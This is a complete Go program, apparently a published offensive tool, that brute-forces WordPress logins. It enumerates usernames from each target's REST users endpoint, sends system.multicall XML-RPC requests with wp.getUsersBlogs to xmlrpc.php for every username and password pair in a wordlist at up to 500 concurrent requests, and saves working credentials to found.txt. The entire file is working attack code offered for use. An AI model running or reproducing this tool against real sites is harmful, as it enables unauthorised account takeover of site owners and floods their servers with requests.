package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type User struct {
	Slug string `json:"slug"`
}

const (
	timeout = 3 * time.Second
	workers = 500
)

func main() {
	urls, err := readLines("url.txt")
	if err != nil {
		return
	}

	passwords, err := readLines("pass.txt")
	if err != nil {
		return
	}

	fmt.Println("\nXMLRPC-BRUTE: A WordPress XML-RPC Brute Force Tool")
	fmt.Println("Created by GitHub.com/mahendraplus\n")

	var wg sync.WaitGroup
	for _, url := range urls {
		wg.Add(1)
		go func(url string) {
			defer wg.Done()
			users, err := fetchUsers(url)
			if err != nil || len(users) == 0 {
				return
			}

			sem := make(chan struct{}, workers) // Semaphore to limit concurrent workers

			for _, user := range users {
				for _, pass := range passwords {
					sem <- struct{}{}
					go func(user, pass string) {
						defer func() { <-sem }()
						xml := createXML(user, pass)
						success, responseTime := sendRequest(url, xml)
						status := "INCORRECT"
						if success {
							status = "CORRECT"
							saveAuth(user, pass, url)
						}
						// Print the result as soon as it's available
						fmt.Printf("%-15s %-25s %-25s %-35s %dms\n", status, user, pass, url, responseTime)
					}(user, pass)
				}
			}
		}(url)
	}

	wg.Wait()
	fmt.Println("\n\nAll tasks completed.")
}

type result struct {
	status       string
	user         string
	pass         string
	url          string
	responseTime int
}

func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func fetchUsers(baseUrl string) ([]string, error) {
	client := http.Client{Timeout: timeout}
	resp, err := client.Get(baseUrl + "/wp-json/wp/v2/users")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("Failed to fetch users, status code: %d", resp.StatusCode)
	}

	var users []User
	err = json.NewDecoder(resp.Body).Decode(&users)
	if err != nil {
		return nil, err
	}

	var usernames []string
	for _, user := range users {
		usernames = append(usernames, user.Slug)
	}

	return usernames, nil
}

func createXML(user, pass string) string {
	return fmt.Sprintf(`<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value>
                          <array>
                            <data>
                              <value><string>%s</string></value>
                              <value><string>%s</string></value>
                            </data>
                          </array>
                        </value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>`, user, pass)
}

func sendRequest(url, xml string) (bool, int) {
	client := http.Client{Timeout: timeout}
	start := time.Now()
	resp, err := client.Post(url+"/xmlrpc.php", "Content-Type:text/xml", bytes.NewBuffer([]byte(xml)))
	responseTime := int(time.Since(start).Milliseconds())
	if err != nil {
		return false, responseTime
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, responseTime
	}

	return strings.Contains(string(body), "<name>isAdmin</name>"), responseTime
}

func saveAuth(user, pass, url string) {
	file, err := os.OpenFile("found.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	_, err = file.WriteString(fmt.Sprintf("%s %s %s\n", user, pass, url))
	if err != nil {
		return
	}
}
